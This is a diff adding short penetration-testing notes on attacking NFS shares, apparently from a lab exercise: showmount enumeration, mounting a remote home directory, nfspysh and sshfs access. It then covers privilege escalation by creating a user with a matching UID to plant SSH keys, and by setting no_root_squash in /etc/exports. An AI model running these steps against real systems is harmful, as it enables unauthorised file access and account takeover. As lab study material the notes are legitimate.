@@ -1,0 +1,14 @@
+NFS
+
+remote exploitation
+showmount -e 192.168.1.100
+mount 192.168.1.100:/home/neo /mnt/x
+nfspysh -o server=192.168.1.100:/home/neo
+sshfs user@192.168.1.100:/home/neo mountname/
+
+privesc
+*adding a user whose name/groupname(s) and sid/gid(s) are identical can be used to exploit exposed nfs systems, e.g. by adding an ssh key to a user directory to gain tty access from filessystem access
+	useradd vulnix –u 2008
+	su vulnix
+sudoedit /etc/exports
+	editing the root_squash option to *(rw,no_root_squash) removes restrictions on filesystem traversal
